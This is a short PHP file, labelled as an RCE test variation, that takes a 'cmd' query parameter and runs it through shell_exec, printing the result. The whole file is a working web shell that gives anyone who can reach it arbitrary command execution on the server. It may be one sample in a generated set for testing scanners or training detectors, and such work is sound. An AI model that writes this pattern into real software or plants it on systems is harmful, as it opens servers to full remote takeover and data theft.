<?php
// RCE test variation #957
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>